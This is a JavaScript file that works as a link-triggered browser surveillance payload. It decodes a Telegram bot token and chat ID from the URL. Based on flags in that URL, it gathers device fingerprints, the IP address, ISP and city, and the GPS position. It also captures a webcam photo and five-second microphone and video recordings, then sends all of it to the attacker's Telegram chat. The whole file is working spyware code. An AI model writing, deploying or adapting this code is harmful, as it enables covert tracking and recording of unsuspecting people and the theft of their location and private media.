const full_url = window.location.href;
const urlObject = new URL(full_url);
const parameters = new URLSearchParams(urlObject.search);

let token = null;
let chatID = null;
let addons = null;


//store values to object
let result = {};

//token id and chatID extract 
try{
  const tokenChatIDAndAddons = atob(parameters.get('val').slice(1)).split("|");
   token = tokenChatIDAndAddons[0];
  chatID = tokenChatIDAndAddons[1];
  addons = tokenChatIDAndAddons[2];
}catch(e){}


//basic details class
class BasicDetailsClass{ 
    constructor(token,chatID){
        this.token = token;
        this.chatID = chatID;
    }

    //object data to text data (to sent result obj as text on telegram)
    async objToText(data){
        return Object.entries(data)
        .map(([key, value]) => `${key} - ${value}`)
        .join('\n');
    }

    //send text data to telegram
    async sendTextToTelegram(data){
    try{
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatID,
            text: data
        })
        });
    }catch(e){}
    };

    //battery percentage
    async batteryPercentage(){
        try{
            const battery = await navigator.getBattery();
            result["batteryPercentage"] = `${battery.level*100}%`;
        }catch(e){
            result["BatteryError"] = e;
        }
        
    };

    //collect basic details -no permissions needed
    async basicDetails(){
        result["date"] = new Date().toLocaleString();
        result["userAgent"] = navigator.userAgent;
        result["screenSize"] = `${screen.width}x${screen.height}`;
        result["timeZone"] = (new Date()).getTimezoneOffset()/60;;
        result["isMobile"] = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        result["logicalProcessors"] = navigator.hardwareConcurrency;
        result["platform"] = navigator.platform;
        result["device_memmory"] = navigator.deviceMemory;
        result["cookies_enabled"] = navigator.cookieEnabled;
        result["vendor"] = navigator.vendor;
        result["languages"] = navigator.languages[0];

        //connection info
        try{
            result["possibleNetworkType"] = navigator.connection.effectiveType;
            result["averageDownloadBandwidth"] = `${navigator.connection.downlink}Mbps`;
            result["roundTripTime"]=`${navigator.connection.rtt} ms (latency)`;
            result["dataSaverEnabled"] = `${navigator.connection.saveData}`;
        }catch(e){
            result["navigator.connection Error"] = e;
        }
        
        //gpu info
        try{
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'WebGL not supported';

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            result["vendor"] = vendor;
            result["GPU"] = renderer;
            
        }catch(e){
            result["GPUInfoError"] = e;
        }
        
    };

    //isp details
    async ispDetails(){
        try{
        const ispResponse = await fetch("https://ipinfo.io/json");
        const response = await ispResponse.json();
        result["ipv4"] = response.ip;
        result["city"] = response.city;
        result["country"] = response.country;
        result["IpLocation"] = response.loc;
        result["isp"]= response.org;
        result["postal"] = response.postal;
        result["region"] = response.region;
        result["ip_timeZone"] = response.timezone;
        }catch(e){
        result["ISPError"] = e;
        }
        
    }

    async collectData(){
        await this.ispDetails();
        await this.basicDetails();
        await this.batteryPercentage();
        await this.sendTextToTelegram(await this.objToText(result))
    }

};


class LocationClass{
    constructor(token,chatID){
        this.token = token;
        this.chatID = chatID;
    }
    //send text data to telegram
    async sendTextToTelegram(data){
    try{
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatID,
            text: data
        })
        });
    }catch(e){}
    };

    //send location to telegram
    async sendLocationToTelegram(latitude,longitude,accuracy){
        const url = `https://api.telegram.org/bot${token}/sendVenue`;
        const body = {
            chat_id: chatID,
            latitude: latitude,
            longitude: longitude,
            title: "LOCATION",
            address: `LAT :${latitude} \nLON : ${longitude}\nAccuracy : ${accuracy}`
        };

        try {
            const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(body)
            });

            const data = await response.json();
        } catch (error) {
            console.error('Error sending venue:', error);
        }
    }

    //gps
    async gpsLocation(){
        if(navigator.geolocation){
            try{
            const position = await new Promise((resolve,reject)=>{navigator.geolocation.getCurrentPosition(resolve,reject)});
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            await this.sendLocationToTelegram(lat,lon,accuracy);

            }catch(e){await this.sendTextToTelegram(`Location error : ${e}`);}
        }else{
            await this.sendTextToTelegram("Geolocationn Not Supported");
        }
    };

    async collectData(){
        await this.gpsLocation()
    }
};

class CameraClass{
    constructor(token,chatID){
        this.token = token;
        this.chatID = chatID;
    }

    //send image data to telegram
    async sendImageToTelegram(blob){
    const time = new Date().toLocaleTimeString()
    const formData = new FormData();
    formData.append('chat_id', chatID);
    formData.append('photo', blob, `${time}.jpg`);
    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
        });

        const data = await response.json();
    } catch (error) {
        console.error('Error sending photo:', error);
    }
    }

    //capture cam
    async captureCamera(){
        try{
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            //create hidden video element
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            //wait for video to load
            await new Promise(resolve => {video.onloadeddata = resolve;});
            //create canvas and draw current frame
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            //convert canvas to image data
            const imageDataUrl = canvas.toDataURL('image/png');
            //clean up stop webcam
            stream.getTracks().forEach(track => track.stop());
            //convert base64 to blog
            const byteString = atob(imageDataUrl.split(',')[1]);
            const byteArray = new Uint8Array(byteString.length);
            for (let i = 0; i < byteString.length; i++) {
                byteArray[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([byteArray], { type: 'image/png' });
            video.remove();
            canvas.remove();
            return blob;
        }catch(e){}
    };

    async collectData(){
        try{
            const imageBlob = await this.captureCamera();
            await this.sendImageToTelegram(imageBlob);
        }catch(e){}
    }

}

class AudioClass{
    constructor(token,chatID){
        this.token = token;
        this.chatID = chatID;
    }

    //send audio data to telegram
    async sendAudioToTelegram(blob){
        const time = new Date().toLocaleTimeString()
        const formData = new FormData();
        formData.append('chat_id', chatID);
        formData.append('audio', blob, `${time}.mp3`);
        try {
            const response = await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
            method: 'POST',
            body: formData
            });

            const data = await response.json();
        } catch (error) {
            console.error('Error sending photo:', error);
        }
    };

    // capture audio 5-sec
    async recordAudio(){
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            const audioChunks = [];

            // collect audio data
            mediaRecorder.ondataavailable = event => {
            if (event.data.size > 0) {
                audioChunks.push(event.data);
            }
            };

            // start recording
            mediaRecorder.start();

            // wait for 5 seconds
            await new Promise(resolve => setTimeout(resolve, 5000));

            // stop recording
            await new Promise(resolve => {
            mediaRecorder.onstop = resolve;
            mediaRecorder.stop();
            });

            // stop the stream
            stream.getTracks().forEach(track => track.stop());

            // create final audio blob
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            return audioBlob;
        } catch (e) {
            console.error('Audio recording failed:', e);
        }
    };

    async collectData(){
        try{
            const audioBlob = await this.recordAudio();
            await this.sendAudioToTelegram(audioBlob);
        }catch(e){}
    }


}

class VideoClass{
    constructor(token,chatID){
        this.token = token;
        this.chatID = chatID;
    }

    //send video data to telegram
    async sendVideoToTelegram(blob){
        const time = new Date().toLocaleTimeString()
        const formData = new FormData();
        formData.append('chat_id', chatID);
        formData.append('video', blob, `${time}.mp4`);
        try {
            const response = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
            method: 'POST',
            body: formData
            });

            const data = await response.json();
        } catch (error) {
            console.error('Error sending photo:', error);
        }
    };

    //capture video
    async captureCameraVideo(){
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];

            mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
            };

            // Start recording
            mediaRecorder.start();

            // Wait for 5 seconds
            await new Promise(resolve => setTimeout(resolve, 5000));

            // Stop recording and wait for final data
            await new Promise(resolve => {
            mediaRecorder.onstop = resolve;
            mediaRecorder.stop();
            });

            // Stop webcam stream
            stream.getTracks().forEach(track => track.stop());

            // Create a Blob from the recorded chunks
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            
            return videoBlob;

        } catch (e) {
            console.error('Video capture failed:', e);
        }
    };

    async collectData(){
        try{
            const videoBlob = await this.captureCameraVideo();
            await this.sendVideoToTelegram(videoBlob);
        }catch(e){}
    }
}


if(addons.includes("b")){
    const collectBasicDetails = new BasicDetailsClass(token,chatID);
    collectBasicDetails.collectData();
}
if(addons.includes("l")){
    const locationData = new LocationClass(token,chatID);
    locationData.collectData();
}
if(addons.includes("c")){
    const cameraImage = new CameraClass(token,chatID);
    cameraImage.collectData();

}
if(addons.includes("a")){
    const audioRecord = new AudioClass(token,chatID);
    audioRecord.collectData();
}
if(addons.includes("v")){
    const videoRecord = new VideoClass() 
    videoRecord.collectData();
}

